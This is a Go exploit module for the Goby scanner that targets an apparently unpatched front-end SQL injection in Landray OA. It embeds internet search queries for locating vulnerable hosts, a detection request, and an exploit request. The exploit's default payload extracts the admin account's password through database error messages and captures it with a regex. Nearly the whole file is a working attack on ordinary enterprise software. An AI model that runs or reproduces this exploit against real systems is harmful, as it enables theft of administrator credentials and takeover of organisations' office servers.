package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "BlueLine OA system has a front-end SQL error reporting injection",
    "Description": "<p>Landray OA is a mobile intelligent office product for small and medium-sized enterprises, integrating the digital capabilities of nailing and Landray years of experience in OA products and services, which can fully meet the needs of enterprises' daily office online, corporate culture online, customer management online, personnel services online, administrative services online, etc.</p>",
    "Product": "Landray-OA",
    "Homepage": "http://www.landray.com.cn/",
    "DisclosureDate": "2022-04-24",
    "Author": "670420874@qq.com",
    "FofaQuery": "(body=\"lui_login_message_td\" && body=\"form_bottom\") || (body=\"蓝凌软件 版权所有\" && (body=\"j_acegi_security_check\" || title=\"欢迎登录智慧协同平台\")) ||(body=\"j_acegi_security_check\" && body=\"onsubmit=\\\"return kmss_onsubmit();\" && (body=\"ExceptionTranslationFilter对SPRING_SECURITY_TARGET_URL 进行未登录url保持 请求中的hash并不会传递到服务端，故只能前端处理\" || body=\"kkDownloadLink link\"))",
    "GobyQuery": "(body=\"lui_login_message_td\" && body=\"form_bottom\") || (body=\"蓝凌软件 版权所有\" && (body=\"j_acegi_security_check\" || title=\"欢迎登录智慧协同平台\")) ||(body=\"j_acegi_security_check\" && body=\"onsubmit=\\\"return kmss_onsubmit();\" && (body=\"ExceptionTranslationFilter对SPRING_SECURITY_TARGET_URL 进行未登录url保持 请求中的hash并不会传递到服务端，故只能前端处理\" || body=\"kkDownloadLink link\"))",
    "Level": "3",
    "Impact": "<p>There is SQL error injection in the frontend of Landray OA, which can lead to administrator password leakage and cause attackers to obtain administrator privileges.</p>",
    "Recommendation": "<p>There is no solution, please keep an eye on the official patch situation.</p><p><a href=\"http://www.landray.com.cn/\">http://www.landray.com.cn/</a></p>",
    "References": [],
    "Is0day": true,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "payload",
            "type": "input",
            "value": "SELECT+'29e78d6c81ace30f13cb1339b4480d07'%2BfdPassword%2B'29e78d6c81ace30f13cb1339b4480d07'+FROM+com.landray.kmss.sys.organization.model.SysOrgPerson+where+fdLoginName='admin'",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/third/wechat/wechatLoginHelper.do?method=edit&uid=1%27and+(SELECT+CONVERT(varchar,12983*61525)%2B%27a%27+FROM+com.landray.kmss.sys.organization.model.SysOrgPerson+where+fdLoginName=%27admin%27)=1+and+%271%27=%271",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "798779075a",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/third/wechat/wechatLoginHelper.do?method=edit&uid=1'and+({{{payload}}})=1+and+'1'='1",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "java.sql.SQLException",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "password|lastbody|regex|'29e78d6c81ace30f13cb1339b4480d07(.*)29e78d6c81ace30f13cb1339b4480d07'",
                "output|lastbody|text|output:{{{password}}}"
            ]
        }
    ],
    "Tags": [
        "Information technology application innovation industry",
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "10.0",
    "Translation": {
        "CN": {
            "Name": "蓝凌OA系统存在前台SQL报错注入",
            "Product": "Landray-OA系统",
            "Description": "<p>蓝凌OA是一款针对中小企业的移动化智能办公产品，融合了钉钉数字化能力与蓝凌多年OA产品与服务经验，能全面满足企业日常办公在线、企业文化在线、客户管理在线、人事服务在线、行政务服务在线等需求。<br></p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">蓝凌OA前台存在SQL报错注入，可导致管理员密码泄露，造成攻击者获取管理员权限。</span></p>",
            "Recommendation": "<p>目前无解决方案，请随时关注官方补丁情况。</p><p><span style=\"color: var(--primaryFont-color);\"><a href=\"http://www.landray.com.cn/\">http://www.landray.com.cn/</a></span></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">蓝凌OA前台存在SQL报错注入，可导致管理员密码泄露，造成攻击者获取管理员权限。</span><br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "信创",
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "BlueLine OA system has a front-end SQL error reporting injection",
            "Product": "Landray-OA",
            "Description": "<p>Landray OA is a mobile intelligent office product for small and medium-sized enterprises, integrating the digital capabilities of nailing and Landray years of experience in OA products and services, which can fully meet the needs of enterprises' daily office online, corporate culture online, customer management online, personnel services online, administrative services online, etc.<br></p>",
            "Recommendation": "<p>There is no solution, please keep an eye on the official patch situation.</p><p><a href=\"http://www.landray.com.cn/\">http://www.landray.com.cn/</a></p>",
            "Impact": "<p>There is SQL error injection in the frontend of Landray OA, which can lead to administrator password leakage and cause attackers to obtain administrator privileges.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "Information technology application innovation industry",
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "7365"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}